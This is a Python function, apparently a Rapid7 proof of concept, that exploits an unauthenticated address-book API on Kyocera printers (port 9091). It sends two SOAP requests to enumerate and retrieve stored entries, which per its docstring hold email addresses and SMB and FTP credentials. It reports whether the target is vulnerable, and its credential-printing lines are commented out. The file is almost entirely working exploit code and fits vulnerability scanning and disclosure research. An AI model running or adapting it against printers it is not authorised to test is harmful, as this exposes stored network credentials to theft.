
import requests
import xmltodict
import time
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


def cve_kyocera(targ):
    """
    Kyocera printer exploit
    Extracts sensitive data stored in the printer address book, unauthenticated, including:
        *email addresses
        *SMB file share credentials used to write scan jobs to a network fileshare
        *FTP credentials

    Author: Aaron Herndon, @ac3lives (Rapid7)
    Date: 11/12/2021
    Tested versions:
        * ECOSYS M2640idw
        *  TASKalfa 406ci
        *
    """
    # Start Exploit ---------------------
    warnings.filterwarnings("ignore")
    url = "https://" + targ + ":9091/ws/km-wsdl/setting/address_book"
    print("Targeting URL: {}".format(url))
    headers = {'content-type': 'application/soap+xml'}
    # Submit an unauthenticated request to tell the printer that a new address book object creation is required
    body = """<?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" 
        xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
        xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" 
        xmlns:xop="http://www.w3.org/2004/08/xop/include" 
        xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
        <SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header>
        <SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body>
        </SOAP-ENV:Envelope>"""

    try:
        response = requests.post(url, data=body, headers=headers, verify=False)
        strResponse = response.content.decode('utf-8')
        #print('strResponse')
        #print(strResponse)

        parsed = xmltodict.parse(strResponse)
        # The SOAP request returns XML with an object ID as an integer stored in kmaddrbook:enumeration.
        # We need this object ID to request the data from the printer.
        getNumber = \
        parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body']['kmaddrbook:create_personal_address_enumerationResponse'][
            'kmaddrbook:enumeration']

        body = """<?xml version="1.0" encoding="utf-8"?>
            <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" 
            xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
            xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" 
            xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">
            <SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header>
            <SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body>
            </SOAP-ENV:Envelope>""".format(getNumber)

        print("Obtained address book object: {}. Waiting for book to populate".format(getNumber))
        time.sleep(5)
        print("Submitting request to retrieve the address book object...")

        response = requests.post(url, data=body, headers=headers, verify=False)
        strResponse = response.content.decode('utf-8')
        #print('strResponse - ', strResponse)

        parsed = xmltodict.parse(strResponse)
        #print('parsed - ', parsed)

        #parsed = parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body']['kmaddrbook:get_personal_address_listResponse']['kmaddrbook:result']
        #print(parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body']['kmaddrbook:get_personal_address_listResponse']['kmaddrbook:result'])
        #quit()

        # What is a result???
        result = ''
        #'kmaddrbook:personal_address'
        #f 'ALL_GET_COMPLETE' in parsed:
        if 'kmaddrbook:personal_address' in parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body'][
            'kmaddrbook:get_personal_address_listResponse']:
            #print(targ + ': VULNERABLE!!!')
            result = 'Vulnerable'
        else:
            #print(targ + ': Not Vulnerable')
            result = 'Not vulnerable'

        #print(parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body']['kmaddrbook:get_personal_address_listResponse']['kmaddrbook:personal_address'])
        #print("\n\nObtained address book. Review the above response for credentials in objects such as 'login_password', 'login_name'")
        # End Exploit ---------------------

    except requests.ConnectionError:
        result = 'Timout tcp/9091'

    return result